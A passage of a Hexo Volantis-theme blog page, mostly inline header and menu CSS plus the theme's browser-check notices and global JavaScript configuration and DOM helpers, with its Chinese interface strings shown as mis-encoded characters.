    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
  }
}
.l_header .switcher >li {
  height: 48px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  margin: 2px;
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li {
    margin: 0 1px;
    height: 48px;
  }
}
.l_header .switcher >li >a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  align-items: center;
  width: 48px;
  height: 48px;
  padding: 0.85em 1.1em;
  border-radius: 100px;
  -webkit-border-radius: 100px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  color: #3dd9b6;
}
.l_header .switcher >li >a:hover {
  border: none;
}
.l_header .switcher >li >a.active,
.l_header .switcher >li >a:active {
  border: none;
  background: var(--color-site-bg);
}
@media screen and (max-width: 500px) {
  .l_header .switcher >li >a {
    width: 36px;
    height: 48px;
  }
}
.l_header .nav-sub .switcher {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
}
.l_header .m_search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  height: 64px;
  width: 240px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (max-width: 1024px) {
  .l_header .m_search {
    width: 44px;
    min-width: 44px;
  }
  .l_header .m_search input::placeholder {
    opacity: 0;
    -webkit-opacity: 0;
    -moz-opacity: 0;
  }
  .l_header .m_search:hover {
    width: 240px;
  }
  .l_header .m_search:hover input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (min-width: 500px) {
  .l_header .m_search:hover .input {
    width: 100%;
  }
  .l_header .m_search:hover .input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search {
    min-width: 0;
  }
  .l_header .m_search input::placeholder {
    opacity: 1;
    -webkit-opacity: 1;
    -moz-opacity: 1;
  }
}
.l_header .m_search .form {
  position: relative;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  width: 100%;
  align-items: center;
}
.l_header .m_search .icon {
  position: absolute;
  width: 36px;
  left: 5px;
  color: var(--color-meta);
}
@media screen and (max-width: 500px) {
  .l_header .m_search .icon {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
.l_header .m_search .input {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding-top: 8px;
  padding-bottom: 8px;
  line-height: 1.3;
  width: 100%;
  color: var(--color-text);
  background: #fafafa;
  box-shadow: none;
  -webkit-box-shadow: none;
  box-sizing: border-box;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  padding-left: 40px;
  font-size: 0.875rem;
  border-radius: 8px;
  -webkit-border-radius: 8px;
  border: none;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
@media screen and (min-width: 500px) {
  .l_header .m_search .input:focus {
    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
  }
}
@media screen and (max-width: 500px) {
  .l_header .m_search .input {
    background: var(--color-block);
    padding-left: 8px;
    border: none;
  }
  .l_header .m_search .input:hover,
  .l_header .m_search .input:focus {
    border: none;
  }
}
@media (max-width: 500px) {
  .l_header .m_search {
    left: 0;
    width: 0;
    overflow: hidden;
    position: absolute;
    background: #fff;
    transition: all 0.28s ease;
    -webkit-transition: all 0.28s ease;
    -khtml-transition: all 0.28s ease;
    -moz-transition: all 0.28s ease;
    -o-transition: all 0.28s ease;
    -ms-transition: all 0.28s ease;
  }
  .l_header .m_search .input {
    border-radius: 32px;
    -webkit-border-radius: 32px;
    margin-left: 16px;
    padding-left: 16px;
  }
  .l_header.z_search-open .m_search {
    width: 100%;
  }
  .l_header.z_search-open .m_search .input {
    width: calc(100% - 120px);
  }
}
ul.m-pc >li>a {
  color: inherit;
  border-bottom: 2px solid transparent;
}
ul.m-pc >li>a:active,
ul.m-pc >li>a.active {
  border-bottom: 2px solid #3dd9b6;
}
ul.m-pc li:hover >ul.list-v,
ul.list-v li:hover >ul.list-v {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.nav-list-h {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: -ms-flexbox /* TWEENER - IE 10 */;
  display: -webkit-flex /* NEW - Chrome */;
  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
  display: flex;
  align-items: stretch;
}
ul.nav-list-h>li {
  position: relative;
  justify-content: center;
  -webkit-justify-content: center;
  -khtml-justify-content: center;
  -moz-justify-content: center;
  -o-justify-content: center;
  -ms-justify-content: center;
  height: 100%;
  line-height: 2.4;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
ul.nav-list-h>li >a {
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  font-weight: 600;
}
ul.list-v {
  z-index: 1;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: absolute;
  background: var(--color-card);
  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
  margin-top: -6px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
  padding: 8px 0;
}
ul.list-v.show {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
}
ul.list-v hr {
  margin-top: 8px;
  margin-bottom: 8px;
}
ul.list-v >li {
  white-space: nowrap;
  word-break: keep-all;
}
ul.list-v >li.header {
  font-size: 0.78125rem;
  font-weight: bold;
  line-height: 2em;
  color: var(--color-meta);
  margin: 8px 16px 4px;
}
ul.list-v >li.header i {
  margin-right: 8px;
}
ul.list-v >li ul {
  margin-left: 0;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: -40px;
}
ul.list-v .aplayer-container {
  min-height: 64px;
  padding: 6px 16px;
}
ul.list-v >li>a {
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  color: var(--color-list);
  font-size: 0.875rem;
  font-weight: bold;
  line-height: 36px;
  padding: 0 20px 0 16px;
  text-overflow: ellipsis;
  margin: 0 4px;
  border-radius: 4px;
  -webkit-border-radius: 4px;
}
@media screen and (max-width: 1024px) {
  ul.list-v >li>a {
    line-height: 40px;
  }
}
ul.list-v >li>a >i {
  margin-right: 8px;
}
ul.list-v >li>a:active,
ul.list-v >li>a.active {
  color: var(--color-list-hl);
}
ul.list-v >li>a:hover {
  color: var(--color-list-hl);
  background: var(--color-site-bg);
}
.l_header .menu >ul>li>a {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: block;
  padding: 0 8px;
}
.l_header .menu >ul>li>a >i {
  margin-right: 4px;
}
.l_header ul.nav-list-h>li {
  color: var(--color-list);
  line-height: 64px;
}
.l_header ul.nav-list-h>li >a {
  max-height: 64px;
  overflow: hidden;
  color: inherit;
}
.l_header ul.nav-list-h>li >a:active,
.l_header ul.nav-list-h>li >a.active {
  color: #3dd9b6;
}
.l_header ul.nav-list-h>li:hover>a {
  color: var(--color-list-hl);
}
.l_header ul.nav-list-h>li i.music {
  animation: rotate-effect 1.5s linear infinite;
  -webkit-animation: rotate-effect 1.5s linear infinite;
  -khtml-animation: rotate-effect 1.5s linear infinite;
  -moz-animation: rotate-effect 1.5s linear infinite;
  -o-animation: rotate-effect 1.5s linear infinite;
  -ms-animation: rotate-effect 1.5s linear infinite;
}
@-moz-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-webkit-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@-o-keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
@keyframes rotate-effect {
  0% {
    transform: rotate(0);
    -webkit-transform: rotate(0);
    -khtml-transform: rotate(0);
    -moz-transform: rotate(0);
    -o-transform: rotate(0);
    -ms-transform: rotate(0);
  }
  25% {
    transform: rotate(90deg);
    -webkit-transform: rotate(90deg);
    -khtml-transform: rotate(90deg);
    -moz-transform: rotate(90deg);
    -o-transform: rotate(90deg);
    -ms-transform: rotate(90deg);
  }
  50% {
    transform: rotate(180deg);
    -webkit-transform: rotate(180deg);
    -khtml-transform: rotate(180deg);
    -moz-transform: rotate(180deg);
    -o-transform: rotate(180deg);
    -ms-transform: rotate(180deg);
  }
  75% {
    transform: rotate(270deg);
    -webkit-transform: rotate(270deg);
    -khtml-transform: rotate(270deg);
    -moz-transform: rotate(270deg);
    -o-transform: rotate(270deg);
    -ms-transform: rotate(270deg);
  }
  100% {
    transform: rotate(360deg);
    -webkit-transform: rotate(360deg);
    -khtml-transform: rotate(360deg);
    -moz-transform: rotate(360deg);
    -o-transform: rotate(360deg);
    -ms-transform: rotate(360deg);
  }
}
.menu-phone li ul.list-v {
  right: calc(100% - 0.5 * 16px);
}
.menu-phone li ul.list-v ul {
  right: calc(100% - 0.5 * 16px);
}
#wrapper {
  max-width: 1080px;
  margin: auto;
}
@media screen and (min-width: 2048px) {
  #wrapper {
    max-width: 55vw;
  }
}
#wrapper .menu {
  -webkit-box-flex: 1;
  -moz-box-flex: 1;
  -webkit-flex: 1 1;
  -ms-flex: 1 1;
  flex: 1 1;
  margin: 0 16px 0 0;
}
#wrapper .menu .list-v ul {
  left: calc(100% - 0.5 * 16px);
}
.menu-phone {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  margin-top: 16px;
  right: 8px;
  transition: all 0.28s ease;
  -webkit-transition: all 0.28s ease;
  -khtml-transition: all 0.28s ease;
  -moz-transition: all 0.28s ease;
  -o-transition: all 0.28s ease;
  -ms-transition: all 0.28s ease;
}
.menu-phone ul {
  right: calc(100% - 0.5 * 16px);
}
@media screen and (max-width: 500px) {
  .menu-phone {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: block;
  }
}
.l_header {
  max-width: 65vw;
  left: calc((100% - 65vw) * 0.5);
  border-bottom-left-radius: 8px;
  border-bottom-right-radius: 8px;
}
@media screen and (max-width: 2048px) {
  .l_header {
    max-width: 1112px;
    left: calc((100% - 1112px) * 0.5);
  }
}
@media screen and (max-width: 1112px) {
  .l_header {
    left: 0;
    border-radius: 0;
    -webkit-border-radius: 0;
    max-width: 100%;
  }
}
@media screen and (max-width: 500px) {
  .l_header .container {
    margin-left: 0;
    margin-right: 0;
  }
  .l_header #wrapper .nav-main .title {
    padding-left: 16px;
    padding-right: 16px;
  }
  .l_header #wrapper .nav-sub {
    width: 100%;
  }
  .l_header #wrapper .nav-sub .title {
    overflow-y: scroll;
    margin-top: 2px;
    padding: 8px 16px;
  }
  .l_header #wrapper .switcher {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: -ms-flexbox /* TWEENER - IE 10 */;
    display: -webkit-flex /* NEW - Chrome */;
    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
    display: flex;
    margin-right: 8px;
  }
  .l_header .menu {
    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
    display: none;
  }
}
@media screen and (max-width: 500px) {
  .list-v li {
    max-width: 270px;
  }
}
#u-search {
  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  padding: 60px 20px;
  z-index: 1001;
}
@media screen and (max-width: 680px) {
  #u-search {
    padding: 0px;
  }
}
@media screen and (prefers-color-scheme: dark) and (max-width: 500px) {
  .l_header .m_search {
    background: var(--color-site-bg) !important;
  }
}

  </style>
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
    <script>
      let userColorScheme=localStorage.getItem("color-scheme")
      if(userColorScheme){
        document.documentElement.setAttribute("color-scheme", userColorScheme);
      }
    </script>
  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
    '.kill-t{'+
      'font-size: 2rem;'+
    '}'+
    '.kill-c{'+
      'font-size: 1.2rem;'+
    '}'+
		'#l_header,#l_body{'+
			'display: none;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        `<span class="kill-t"><b>æŠ±æ­‰ï¼Œæ‚¨çš„æµè§ˆå™¨æ— æ³•è®¿é—®æœ¬ç«™</b></span><br/>`+
        `<span class="kill-c">å¾®è½¯å·²ç»äº2016å¹´ç»ˆæ­¢äº†å¯¹ Internet Explorer (IE) 10 åŠæ›´æ—©ç‰ˆæœ¬çš„æ”¯æŒï¼Œ<br/>ç»§ç»­ä½¿ç”¨å­˜åœ¨æå¤§çš„å®‰å…¨éšæ‚£ï¼Œè¯·ä½¿ç”¨å½“ä»£ä¸»æµçš„æµè§ˆå™¨è¿›è¡Œè®¿é—®ã€‚</span><br/>`+
        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>äº†è§£è¯¦æƒ… ></strong></a>`+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
    .kill-t{
      font-size: 2rem;
    }
    .kill-c{
      font-size: 1.2rem;
    }
		#l_header,#l_body{
			display: none;
		}
	</style>
    <div class="kill-noscript">
        <span class="kill-t"><b>æŠ±æ­‰ï¼Œæ‚¨çš„æµè§ˆå™¨æ— æ³•è®¿é—®æœ¬ç«™</b></span><br/>
        <span class="kill-c">æœ¬é¡µé¢éœ€è¦æµè§ˆå™¨æ”¯æŒï¼ˆå¯ç”¨ï¼‰JavaScript</span><br/>
        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=å¯ç”¨JavaScript"><strong>äº†è§£è¯¦æƒ… ></strong></a>
    </div>
</noscript>


  <script>
  /************è¿™ä¸ªæ–‡ä»¶å­˜æ”¾ä¸éœ€è¦é‡è½½çš„å…¨å±€å˜é‡å’Œå…¨å±€å‡½æ•°*********/
  window.volantis = {}; // volantis å…¨å±€å˜é‡
  volantis.debug = "env"; // è°ƒè¯•æ¨¡å¼
  volantis.dom = {}; // é¡µé¢Dom see: /source/js/app.js etc.

  volantis.GLOBAL_CONFIG ={
    debug: "env",
    cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
    lastupdate: new Date(1709639701479),
    sidebar: {
      for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
      for_post: ["toc","blogger","qrcode"],
      webinfo: {
        lastupd: {
          enable: true,
          friendlyShow: true
        },
        runtime: {
          data: "2022/12/01",
          unit: "å¤©"
        }
      }
    },
    plugins: {
      message: {"enable":true,"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/css/iziToast.min.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/js/iziToast.min.js","icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"çŸ¥è¯†å…±äº«è®¸å¯åè®®","message":"è¯·éµå®ˆ CC BY-NC-SA 4.0 åè®®ã€‚","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
      fancybox: {"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.umd.js"},
      
      aplayer: {
        id: 8913002428,
        enable:true
      },
      
      
      
      rightmenus: {"enable":true,"order":["plugins.navigation","hr","plugins.inputBox","plugins.seletctText","plugins.elementCheck","plugins.elementImage","menus.link","hr","menus.darkMode","plugins.articlePage","music"],"options":{"iconPrefix":"fa-solid","articleShowLink":true,"musicAlwaysShow":true},"plugins":{"navigation":[{"id":"left","name":"è½¬åˆ°ä¸Šä¸€é¡µ","icon":"fa-solid fa-arrow-left","event":"history.back()","group":"navigation"},{"id":"right","name":"è½¬åˆ°ä¸‹ä¸€é¡µ","icon":"fa-solid fa-arrow-right","event":"history.forward()","group":"navigation"},{"id":"redo","name":"åˆ·æ–°å½“å‰é¡µé¢","icon":"fa-solid fa-redo","event":"window.location.reload()","group":"navigation"},{"id":"up","name":"å›åˆ°é¡¶éƒ¨","icon":"fa-solid fa-arrow-up","event":"VolantisApp.scrolltoElement(volantis.dom.bodyAnchor)","group":"navigation"}],"inputBox":[{"id":"copyPaste","name":"ç²˜è´´æ–‡æœ¬","icon":"fa-solid fa-paste","event":"copyPaste","group":"inputBox"},{"id":"copyAll","name":"å…¨é€‰æ–‡æœ¬","icon":"fa-solid fa-object-ungroup","event":"copyAll","group":"inputBox"},{"id":"copyCut","name":"å‰ªåˆ‡æ–‡æœ¬","icon":"fa-solid fa-cut","event":"copyCut","group":"inputBox"}],"seletctText":[{"id":"copyText","name":"å¤åˆ¶æ–‡æœ¬","icon":"fa-solid fa-copy","event":"copyText","group":"seletctText"},{"id":"searchWord","name":"ç«™å†…æœç´¢","icon":"fa-solid fa-search","event":"OpenSearch(__text__)","group":"seletctText"},{"id":"bingSearch","name":"å¿…åº”æœç´¢","icon":"fa-solid fa-search","event":"window.open(`https://cn.bing.com/search?q=${__text__}`)","group":"seletctText"}],"elementCheck":[{"id":"openTab","name":"æ–°æ ‡ç­¾é¡µæ‰“å¼€","icon":"fa-solid fa-external-link-square-alt","event":"window.open(__link__)","group":"elementCheck"},{"id":"copyLink","name":"å¤åˆ¶é“¾æ¥åœ°å€","icon":"fa-solid fa-link","event":"copyLink","group":"elementCheck"}],"elementImage":[{"id":"copyImg","name":"å¤åˆ¶å›¾ç‰‡","icon":"fa-solid fa-image","event":"copyImg","group":"elementImage"},{"id":"googleImg","name":"è°·æ­Œè¯†å›¾","icon":"fa-solid fa-images","event":"window.open(`https://www.google.com.hk/searchbyimage?image_url=${__link__}`)","group":"elementImage"}],"articlePage":[{"id":"printMode","name":"æ‰“å°é¡µé¢","icon":"fa-solid fa-print","event":"printMode","group":"articlePage"},{"id":"readMode","name":"é˜…è¯»æ¨¡å¼","icon":"fa-solid fa-book-open","event":"readMode","group":"articlePage"}]},"menus":{"link":[{"id":"help","name":"å¸¸è§é—®é¢˜","icon":"fa-solid fa-question","link":"https://volantis.js.org/faqs/","group":"link"},{"id":"source_docs","name":"æœ¬ç«™æºç ","icon":"fa-solid fa-code-branch","link":"https://github.com/LBiyou/LBiyou.github.io","group":"link"}],"darkMode":[{"id":"darkMode","name":"å¤œé—´æ¨¡å¼","icon":"fa-solid fa-moon","event":"volantis.dark.toggle()","group":"darkMode"}]}}
      
    }
  }

  /******************** volantis.EventListener ********************************/
  // äº‹ä»¶ç›‘å¬å™¨ see: /source/js/app.js
  volantis.EventListener = {}
  // è¿™é‡Œå­˜æ”¾pjaxåˆ‡æ¢é¡µé¢æ—¶å°†è¢«ç§»é™¤çš„äº‹ä»¶ç›‘å¬å™¨
  volantis.EventListener.list = []
  //æ„é€ æ–¹æ³•
  function volantisEventListener(type, f, ele) {
    this.type = type
    this.f = f
    this.ele = ele
  }
  // ç§»é™¤äº‹ä»¶ç›‘å¬å™¨
  volantis.EventListener.remove = () => {
    volantis.EventListener.list.forEach(function (i) {
      i.ele.removeEventListener(i.type, i.f, false)
    })
    volantis.EventListener.list = []
  }
  /******************** volantis.dom.$ ********************************/
  // æ³¨ï¼šè¿™é‡Œæ²¡æœ‰é€‰æ‹©å™¨ï¼Œä¹Ÿæ²¡æœ‰forEachä¸€æ¬¡åªå¤„ç†ä¸€ä¸ªdomï¼Œè¿™é‡Œé‡æ–°å°è£…ä¸»é¢˜å¸¸ç”¨çš„domæ–¹æ³•ï¼Œè¿”å›çš„æ˜¯domå¯¹è±¡ï¼Œå¯¹è±¡åŒ…å«äº†ä»¥ä¸‹æ–¹æ³•ï¼ŒåŒæ—¶ä¿ç•™domçš„åŸç”ŸAPI
  function volantisDom(ele) {
    if (!ele) ele = document.createElement("div")
    this.ele = ele;
    // ==============================================================
    this.ele.find = (c) => {
      let q = this.ele.querySelector(c)
      if (q)
        return new volantisDom(q)
    }
    // ==============================================================
    this.ele.hasClass = (c) => {
      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
    }
    this.ele.addClass = (c) => {
      this.ele.classList.add(c);
      return this.ele
    }
    this.ele.removeClass = (c) => {
      this.ele.classList.remove(c);
      return this.ele
    }
    this.ele.toggleClass = (c) => {
      if (this.ele.hasClass(c)) {
        this.ele.removeClass(c)
      } else {
        this.ele.addClass(c)
      }
      return this.ele
    }
    // ==============================================================
    // å‚æ•° r ä¸º true è¡¨ç¤ºpjaxåˆ‡æ¢é¡µé¢æ—¶äº‹ä»¶ç›‘å¬å™¨å°†è¢«ç§»é™¤ï¼Œfalseä¸ç§»é™¤
    this.ele.on = (c, f, r = 1) => {
      this.ele.addEventListener(c, f, false)
      if (r) {
        volantis.EventListener.list.push(new volantisEventListener(c, f, this.ele))
      }
      return this.ele
    }
    this.ele.click = (f, r) => {
      this.ele.on("click", f, r)
      return this.ele
    }
    this.ele.scroll = (f, r) => {
      this.ele.on("scroll", f, r)
      return this.ele
    }
    // ==============================================================
    this.ele.html = (c) => {
      // if(c=== undefined){
      //   return this.ele.innerHTML
      // }else{
      this.ele.innerHTML = c
      return this.ele
      // }
    }
    // ==============================================================
    this.ele.hide = (c) => {
      this.ele.style.display = "none"
      return this.ele
    }
    this.ele.show = (c) => {
      this.ele.style.display = "block"
      return this.ele
    }
    // ==============================================================
    return this.ele
  }
  volantis.dom.$ = (ele) => {
    return !!ele ? new volantisDom(ele) : null;
  }
  /******************** RunItem ********************************/
  function RunItem() {
    this.list = []; // å­˜æ”¾å›è°ƒå‡½æ•°
    this.start = () => {
      for (var i = 0; i < this.list.length; i++) {
        this.list[i].run();
      }
    };
    this.push = (fn, name, setRequestAnimationFrame = true) => {
      let myfn = fn
      if (setRequestAnimationFrame) {
        myfn = ()=>{
          volantis.requestAnimationFrame(fn)
        }
      }
      var f = new Item(myfn, name);
      this.list.push(f);
    };
    this.remove = (name) =>{
      for (let index = 0; index < this.list.length; index++) {
        const e = this.list[index];
        if (e.name == name) {
